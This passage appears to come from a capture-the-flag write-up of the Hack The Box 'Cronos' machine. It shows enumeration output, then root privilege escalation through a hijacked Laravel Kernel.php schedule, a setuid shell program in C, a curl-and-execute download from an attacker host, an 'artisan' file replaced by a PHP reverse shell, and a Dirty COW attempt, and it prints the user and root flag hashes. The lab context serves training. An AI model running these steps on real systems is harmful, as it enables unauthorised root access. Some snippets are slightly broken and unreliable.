root root 32 Mar 22  2017 systemd-journald-audit.socket -&gt; ../systemd-journald-audit.socket<br/>lrwxrwxrwx 1 root root 34 Mar 22  2017 systemd-journald-dev-log.socket -&gt; ../systemd-journald-dev-log.socket<br/>lrwxrwxrwx 1 root root 26 Mar 22  2017 systemd-journald.socket -&gt; ../systemd-journald.socket<br/>lrwxrwxrwx 1 root root 31 Mar 22  2017 systemd-udevd-control.socket -&gt; ../systemd-udevd-control.socket<br/>lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -&gt; ../dbus.socket<br/><br/>/lib/systemd/system/systemd-timesyncd.service.d:<br/>total 4.0K<br/>-rw-r--r-- 1 root root 251 Jan 12  2017 disable-with-time-daemon.conf<br/><br/>/lib/systemd/system/timers.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 31 Mar 22  2017 systemd-tmpfiles-clean.timer -&gt; ../systemd-tmpfiles-clean.timer<br/><br/>/lib/systemd/system/rc-local.service.d:<br/>total 4.0K<br/>-rw-r--r-- 1 root root 290 Jan 12  2017 debian.conf<br/><br/>/lib/systemd/system/rescue.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 39 Mar 22  2017 systemd-update-utmp-runlevel.service -&gt; ../systemd-update-utmp-runlevel.service<br/><br/>/lib/systemd/system/resolvconf.service.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 42 Mar 22  2017 systemd-networkd-resolvconf-update.path -&gt; ../systemd-networkd-resolvconf-update.path<br/><br/>/lib/systemd/system/sigpwr.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 36 Mar 22  2017 sigpwr-container-shutdown.service -&gt; ../sigpwr-container-shutdown.service<br/><br/>/lib/systemd/system/graphical.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 39 Mar 22  2017 systemd-update-utmp-runlevel.service -&gt; ../systemd-update-utmp-runlevel.service<br/><br/>/lib/systemd/system/local-fs.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 29 Mar 22  2017 systemd-remount-fs.service -&gt; ../systemd-remount-fs.service<br/><br/>/lib/systemd/system/getty.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 23 Mar 22  2017 getty-static.service -&gt; ../getty-static.service<br/><br/>/lib/systemd/system/busnames.target.wants:<br/>total 0<br/><br/>/lib/systemd/system/runlevel1.target.wants:<br/>total 0<br/><br/>/lib/systemd/system/runlevel2.target.wants:<br/>total 0<br/><br/>/lib/systemd/system/runlevel3.target.wants:<br/>total 0<br/><br/>/lib/systemd/system/runlevel4.target.wants:<br/>total 0<br/><br/>/lib/systemd/system/runlevel5.target.wants:<br/>total 0<br/><br/>/lib/systemd/system-sleep:<br/>total 4.0K<br/>-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm<br/><br/>/lib/systemd/system-generators:<br/>total 680K<br/>-rwxr-xr-x 1 root root  59K Jan 19  2017 systemd-dbus1-generator<br/>-rwxr-xr-x 1 root root  71K Jan 19  2017 systemd-cryptsetup-generator<br/>-rwxr-xr-x 1 root root  43K Jan 19  2017 systemd-debug-generator<br/>-rwxr-xr-x 1 root root  79K Jan 19  2017 systemd-fstab-generator<br/>-rwxr-xr-x 1 root root  39K Jan 19  2017 systemd-getty-generator<br/>-rwxr-xr-x 1 root root 119K Jan 19  2017 systemd-gpt-auto-generator<br/>-rwxr-xr-x 1 root root  39K Jan 19  2017 systemd-hibernate-resume-generator<br/>-rwxr-xr-x 1 root root  39K Jan 19  2017 systemd-insserv-generator<br/>-rwxr-xr-x 1 root root  35K Jan 19  2017 systemd-rc-local-generator<br/>-rwxr-xr-x 1 root root  31K Jan 19  2017 systemd-system-update-generator<br/>-rwxr-xr-x 1 root root 103K Jan 19  2017 systemd-sysv-generator<br/>-rwxr-xr-x 1 root root  11K Apr 16  2016 lvm2-activation-generator<br/><br/>/lib/systemd/system-preset:<br/>total 4.0K<br/>-rw-r--r-- 1 root root 869 Jan 19  2017 90-systemd.preset<br/><br/>/lib/systemd/network:<br/>total 12K<br/>-rw-r--r-- 1 root root 404 Jan 19  2017 80-container-host0.network<br/>-rw-r--r-- 1 root root 482 Jan 19  2017 80-container-ve.network<br/>-rw-r--r-- 1 root root  80 Jan 19  2017 99-default.link<br/><br/>/lib/systemd/system-shutdown:<br/>total 0<br/><br/><br/>### SOFTWARE #############################################<br/>[-] Sudo version:<br/>Sudo version 1.8.16<br/><br/><br/>[-] MYSQL version:<br/>mysql  Ver 14.14 Distrib 5.7.17, for Linux (x86_64) using  EditLine wrapper<br/><br/><br/>[-] Apache version:<br/>Server version: Apache/2.4.18 (Ubuntu)<br/>Server built:   2016-07-14T12:32:26<br/><br/><br/>[-] Apache user configuration:<br/>APACHE_RUN_USER=www-data<br/>APACHE_RUN_GROUP=www-data<br/><br/><br/>[-] Installed Apache modules:<br/>Loaded Modules:<br/> core_module (static)<br/> so_module (static)<br/> watchdog_module (static)<br/> http_module (static)<br/> log_config_module (static)<br/> logio_module (static)<br/> version_module (static)<br/> unixd_module (static)<br/> access_compat_module (shared)<br/> alias_module (shared)<br/> auth_basic_module (shared)<br/> authn_core_module (shared)<br/> authn_file_module (shared)<br/> authz_core_module (shared)<br/> authz_host_module (shared)<br/> authz_user_module (shared)<br/> autoindex_module (shared)<br/> deflate_module (shared)<br/> dir_module (shared)<br/> env_module (shared)<br/> filter_module (shared)<br/> mime_module (shared)<br/> mpm_prefork_module (shared)<br/> negotiation_module (shared)<br/> php7_module (shared)<br/> setenvif_module (shared)<br/> status_module (shared)<br/><br/><br/>### INTERESTING FILES ####################################<br/>[-] Useful file locations:<br/>/bin/nc<br/>/bin/netcat<br/>/usr/bin/wget<br/>/usr/bin/curl<br/><br/><br/>[-] Can we read/write sensitive files:<br/>-rw-r--r-- 1 root root 1667 Apr  9  2017 /etc/passwd<br/>-rw-r--r-- 1 root root 832 Apr  9  2017 /etc/group<br/>-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile<br/>-rw-r----- 1 root shadow 1191 Apr  9  2017 /etc/shadow<br/><br/><br/>[-] SUID files:<br/>-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping<br/>-rwsr-xr-x 1 root root 27608 Dec 16  2016 /bin/umount<br/>-rwsr-xr-x 1 root root 40152 Dec 16  2016 /bin/mount<br/>-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount<br/>-rwsr-xr-x 1 root root 40128 Mar 29  2016 /bin/su<br/>-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g<br/>-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6<br/>-rwsr-xr-x 1 root root 38984 Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br/>-rwsr-xr-x 1 root root 56456 Feb 24  2017 /usr/lib/snapd/snap-confine<br/>-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device<br/>-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1<br/>-rwsr-xr-x 1 root root 428240 Aug 11  2016 /usr/lib/openssh/ssh-keysign<br/>-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br/>-rwsr-xr-x 1 root root 40432 Mar 29  2016 /usr/bin/chsh<br/>-rwsr-xr-x 1 root root 32944 Mar 29  2016 /usr/bin/newuidmap<br/>-rwsr-xr-x 1 root root 136808 Jan 20  2017 /usr/bin/sudo<br/>-rwsr-xr-x 1 root root 49584 Mar 29  2016 /usr/bin/chfn<br/>-rwsr-xr-x 1 root root 39904 Mar 29  2016 /usr/bin/newgrp<br/>-rwsr-sr-x 1 daemon daemon 51464 Jan 15  2016 /usr/bin/at<br/>-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec<br/>-rwsr-xr-x 1 root root 32944 Mar 29  2016 /usr/bin/newgidmap<br/>-rwsr-xr-x 1 root root 75304 Mar 29  2016 /usr/bin/gpasswd<br/>-rwsr-xr-x 1 root root 54256 Mar 29  2016 /usr/bin/passwd<br/><br/><br/>[-] SGID files:<br/>-rwxr-sr-x 1 root shadow 35600 Mar 16  2016 /sbin/unix_chkpwd<br/>-rwxr-sr-x 1 root shadow 35632 Mar 16  2016 /sbin/pam_extrausers_chkpwd<br/>-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter<br/>-rwxr-sr-x 1 root utmp 434216 Feb  7  2016 /usr/bin/screen<br/>-rwxr-sr-x 1 root ssh 358624 Aug 11  2016 /usr/bin/ssh-agent<br/>-rwxr-sr-x 1 root mlocate 39520 Nov 18  2014 /usr/bin/mlocate<br/>-rwxr-sr-x 1 root shadow 62336 Mar 29  2016 /usr/bin/chage<br/>-rwxr-sr-x 1 root crontab 36080 Apr  6  2016 /usr/bin/crontab<br/>-rwsr-sr-x 1 daemon daemon 51464 Jan 15  2016 /usr/bin/at<br/>-rwxr-sr-x 1 root tty 27368 Dec 16  2016 /usr/bin/wall<br/>-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write<br/>-rwxr-sr-x 1 root shadow 22768 Mar 29  2016 /usr/bin/expiry<br/><br/><br/>[+] Files with POSIX capabilities set:<br/>/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep<br/>/usr/bin/mtr = cap_net_raw+ep<br/>/usr/bin/traceroute6.iputils = cap_net_raw+ep<br/><br/><br/>[-] Can't search *.conf files as no keyword was entered<br/><br/>[-] Can't search *.php files as no keyword was entered<br/><br/>[-] Can't search *.log files as no keyword was entered<br/><br/>[-] Can't search *.ini files as no keyword was entered<br/><br/>[-] All *.conf files in /etc (recursive 1 level):<br/>-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf<br/>-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf<br/>-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf<br/>-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf<br/>-rw-r--r-- 1 root root 7788 Mar 22  2017 /etc/ca-certificates.conf<br/>-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf<br/>-rw-r--r-- 1 root root 100 Nov 25  2015 /etc/sos.conf<br/>-rw-r--r-- 1 root root 1371 Jan 28  2016 /etc/rsyslog.conf<br/>-rw-r--r-- 1 root root 350 Mar 22  2017 /etc/popularity-contest.conf<br/>-rw-r--r-- 1 root root 2084 Sep  6  2015 /etc/sysctl.conf<br/>-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf<br/>-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf<br/>-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf<br/>-rw-r--r-- 1 root root 6816 Nov 30  2016 /etc/overlayroot.conf<br/>-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf<br/>-rw-r--r-- 1 root root 3028 Feb 15  2017 /etc/adduser.conf<br/>-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf<br/>-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf<br/>-rw-r--r-- 1 root root 191 Jan 19  2016 /etc/libaudit.conf<br/>-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf<br/>-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf<br/>-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf<br/>-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf<br/>-rw-r--r-- 1 root root 144 Mar 22  2017 /etc/kernel-img.conf<br/><br/><br/>[-] Location and contents (if accessible) of .bash_history file(s):<br/>/home/noulis/.bash_history<br/><br/><br/>[-] Location and Permissions (if accessible) of .bak file(s):<br/>-rw------- 1 root root 820 Mar 22  2017 /var/backups/group.bak<br/>-rw------- 1 root root 1632 Mar 22  2017 /var/backups/passwd.bak<br/>-rw------- 1 root shadow 690 Mar 22  2017 /var/backups/gshadow.bak<br/>-rw------- 1 root shadow 1068 Mar 22  2017 /var/backups/shadow.bak<br/><br/><br/>[-] Any interesting mail in /var/mail:<br/>total 8<br/>drwxrwsr-x  2 root mail 4096 Feb 15  2017 .<br/>drwxr-xr-x 14 root root 4096 Mar 22  2017 ..<br/><br/><br/>### SCAN COMPLETE ####################################<br/></div>
<div class="page" id="schdeuled laravel owned by root"><h1><b><u>schdeuled laravel owned by root</u></b></h1><img alt="images/387-1.png" src="images/387-1.png"/></div>
<div class="page" id="priv esc with Kernel.php"><h1><b><u>priv esc with Kernel.php</u></b></h1><span style="color:#24ff00;">In this section we are going to take advantage of crono's laravel scheduling task through its Kernel.php program that gets periodically run by root, </span></div>
<div class="page" id="laravel scheduling task"><h1><b><u>laravel scheduling task</u></b></h1><img alt="images/386-1.png" src="images/386-1.png"/><br/><br/><br/><br/><img alt="images/386-2.png" src="images/386-2.png"/><br/><br/><span style="color:#ffa500;">app/Console.Kernel.php</span><span style="color:#24ff00;"> is where we schedule commands!</span><br/><br/><img alt="images/386-3.png" src="images/386-3.png"/><br/><br/><span style="color:#ffa500;">$schedule-&gt;exec('cmd')-&gt;daily()</span><br/><br/></div>
<div class="page" id="find app/Console/Kernel.php"><h1><b><u>find app/Console/Kernel.php</u></b></h1><span style="color:#24ff00;">we'll run a find / function and look for any files containing Kernel.php with the command</span><br/><br/><span style="color:#ffa500;">find / -name Kernel.php 2&gt;/dev/null</span><br/><br/><img alt="images/388-1.png" src="images/388-1.png"/><br/><br/>Kernel.php <span style="color:#24ff00;text-decoration:underline;">is what we're looking for!</span><br/><img alt="images/388-2.png" src="images/388-2.png"/><br/></div>
<div class="page" id="Kernel.php"><h1><b><u>Kernel.php</u></b></h1><span style="color:#24ff00;">Find </span><span style="color:#ffa500;">Kernel.php </span><span style="color:#24ff00;">directory and open it with </span><span style="color:#ffa500;">vi</span><br/><img alt="images/389-1.png" src="images/389-1.png"/><br/><br/><br/><span style="color:#24ff00;">create a function to create </span><span style="color:#ffa500;">ippsec</span><span style="color:#24ff00;"> file every minute in </span><span style="color:#ffa500;">/tmp </span><span style="color:#24ff00;">folder</span> <span style="color:#24ff00;">with</span><br/><span style="color:#ffa500;">touch /tmp/ippsec</span><br/><img alt="images/389-2.png" src="images/389-2.png"/><br/><br/><br/><span style="color:#24ff00;">now check for </span><span style="color:#ffa500;">ippsec</span><span style="color:#24ff00;"> fiiles on minute</span><br/><img alt="images/389-3.png" src="images/389-3.png"/><br/><br/><br/><span style="color:#24ff00;">Success!</span><br/><br/><img alt="images/389-4.png" src="images/389-4.png"/></div>
<div class="page" id="setuid.c"><h1><b><u>setuid.c</u></b></h1><span style="color:#24ff00;">simple </span><span style="color:#ffa500;">setuid c </span><span style="color:#24ff00;">program: to spawn a shell with root privileges</span>:<br/><br/><span style="color:#ffa500;">int main(void)<br/>{<br/>        setuid(0);<br/>        setgid(0);<br/>        system("bin/bash");<br/>}</span><br/><br/><img alt="images/390-1.png" src="images/390-1.png"/><br/><br/><br/><span style="color:#24ff00;">compile:</span><br/><span style="color:#ffa500;">gcc getuid.c -o st0ve</span><br/><img alt="images/390-2.png" src="images/390-2.png"/><br/><br/><span style="color:#24ff00;">no errors</span><br/><img alt="images/390-3.png" src="images/390-3.png"/><br/></div>
<div class="page" id="CURL program to cronos"><h1><b><u>CURL program to cronos</u></b></h1><span style="color:#24ff00;">you can curl the file and output it to a file with</span><br/><span style="color:#ffa500;">curl &lt;attack_machine ip&gt;:port/file -o savefile</span><br/><br/><img alt="images/391-1.png" src="images/391-1.png"/><br/><br/><span style="color:#24ff00;">give it execute capabilites with </span><span style="color:#ffa500;">chmod +x &lt;file&gt; </span><span style="color:#24ff00;">and run it with</span><span style="color:#ffa500;"> ./&lt;file&gt;</span><br/><img alt="images/391-2.png" src="images/391-2.png"/></div>
<div class="page" id="update Kernel.php/ change owner of setuid.c to root"><h1><b><u>update Kernel.php/ change owner of setuid.c to root</u></b></h1><span style="color:#24ff00;">since root runs the laravel kerpnel.php, we can change our setUID program to be owned by root with the following code and save it </span><br/><br/><span style="color:#ffa500;">chown root:root /dev/shm/st0ve;</span> changes ownership of the st0ve file to root<br/><span style="color:#ffa500;">chmod 4755 /dev/shm/st0ve </span>turns on the functions SUID bit which allows any user to run the program with root privileges<br/><br/><br/><img alt="images/392-1.png" src="images/392-1.png"/><br/><br/><br/><br/><img alt="images/392-2.png" src="images/392-2.png"/><br/><br/><span style="color:#24ff00;">BUT WAIT... we cannot run our getuid script from /dev/shm, so we need to move the file to the tmp folder and execute it there....</span></div>
<div class="page" id="move getuid.c to tmp folder &amp; privesc"><h1><b><u>move getuid.c to tmp folder &amp; privesc</u></b></h1><span style="color:#ffa500;">chmod 4755 </span><span style="color:#24ff00;">sets the UID to root, sets owner privileges to rwx, sets group to rw, and user privileges to rw</span><br/><span style="color:#24ff00;">our code is also moving our binary to the </span><span style="color:#ffa500;">/tmp </span><span style="color:#24ff00;">folder where we can execute it</span><br/><br/><br/><img alt="images/380-1.png" src="images/380-1.png"/><br/><img alt="images/380-2.png" src="images/380-2.png"/><br/><br/>we use 4 digits because the SUID (set uid) bit can be set<br/><br/><span style="color:#ffa500;">    protected function schedule(Schedule $schedule)<br/>    {<br/><br/>	$schedule-&gt;exec('mv /dev/shm/st0ve /tmp/; chmod 4755 /dev/shm/st0ve')-&gt;everyminute();<br/><br/>    }<br/></span><br/><br/><img alt="images/380-3.png" src="images/380-3.png"/><br/><br/><span style="color:#24ff00;">now we see our c program with root permisisons:</span><br/><img alt="images/380-4.png" src="images/380-4.png"/></div>
<div class="page" id="root"><h1><b><u>root</u></b></h1><span style="color:#24ff00;">simply run it and we escalate to </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">!</span><br/><br/><img alt="images/393-1.png" src="images/393-1.png"/></div>
<div class="page" id="priv esc with artisan"><h1><b><u>priv esc with artisan</u></b></h1><span style="color:#24ff00;">we know laravel runs </span><span style="color:#ffa500;">artisan</span><span style="color:#24ff00;"> but it runs a specific script within our laravel directory labeled </span><span style="color:#ffa500;">artisan</span><br/><img alt="images/1106-1.png" src="images/1106-1.png"/><br/><br/><span style="color:#24ff00;">if we check who owns this file, we see that we do, even though it is run by </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;"> in the </span><span style="color:#ffa500;">cron job</span><br/><img alt="images/1106-2.png" src="images/1106-2.png"/><br/><br/>as we see, we OWN artisan, which gives us the permission to rewrite it, so lets <span style="color:#ffff00;">overwrite/hijack</span><span style="color:#24ff00;"> artisan with a </span><span style="color:#ffa500;">php-reverse-shell</span><span style="color:#24ff00;"> back to our machine which will be run by root every time the </span><span style="color:#ffa500;">cron</span><span style="color:#24ff00;"> is called<br/><br/>we can move our </span><span style="color:#ffa500;">php-reverse-shell</span><span style="color:#24ff00;"> and save it to the same name as artisan<br/></span></div>
<div class="page" id="php-reverse-shell"><h1><b><u>php-reverse-shell</u></b></h1><span style="color:#24ff00;">lets first find our desired script on our attacking machine<br/><br/></span><img alt="images/1107-1.png" src="images/1107-1.png"/><br/><br/><img alt="images/1107-2.png" src="images/1107-2.png"/><br/><br/>next step is to set the parameters to connect back to our attack machine IP and a port we want to listen on<br/><img alt="images/1107-3.png" src="images/1107-3.png"/><br/><br/>we can download this php script to the box or save it directly there<br/><br/>to have cronos download it, set a simplehttpserver with python and serve the file to the box<br/><br/><img alt="images/1107-4.png" src="images/1107-4.png"/><br/><br/><img alt="images/1107-5.png" src="images/1107-5.png"/><br/><br/><img alt="images/1107-6.png" src="images/1107-6.png"/><br/><br/><img alt="images/1107-7.png" src="images/1107-7.png"/><br/><br/><img alt="images/1107-8.png" src="images/1107-8.png"/><br/><br/><br/></div>
<div class="page" id="priv esc with kernel exploit dirty cow"><h1><b><u>priv esc with kernel exploit dirty cow</u></b></h1><span style="color:#24ff00;">another method is to transfer</span><span style="color:#ffa500;"> linux-exploit-suggester</span><span style="color:#24ff00;"> and see what types of vulnerabilities it finds<br/><br/>first transfer</span><span style="color:#ffa500;"> linux-exploit suggester </span><span style="color:#24ff00;">to our victim box in the /dev/shm directory<br/><br/></span><img alt="images/1108-1.png" src="images/1108-1.png"/><br/><br/>from this report we  see <span style="color:#ffa500;">dirty_cow</span><span style="color:#24ff00;"> should work which we can find visiting that link<br/><br/>I wasn’t able to successfully exploit </span><span style="color:#ffa500;">Dirty COW</span><span style="color:#24ff00;"> on this machine but that doesn’t mean it’s not vulnerable. It could be vulnerable to a different variant of the exploit that I tested.<br/></span></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/394-1.png" src="images/394-1.png"/><span style="color:#ffff00;"><br/>51d236438b333970dbba7dc3089be33b<br/><br/></span><img alt="images/394-2.png" src="images/394-2.png"/><br/>1703b8a3c9a8dde879942c79d02fd3a0</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1103-1.png" src="images/1103-1.png"/><br/><br/><img alt="images/1103-2.png" src="images/1103-2.png"/></div>
</div>

</body></html>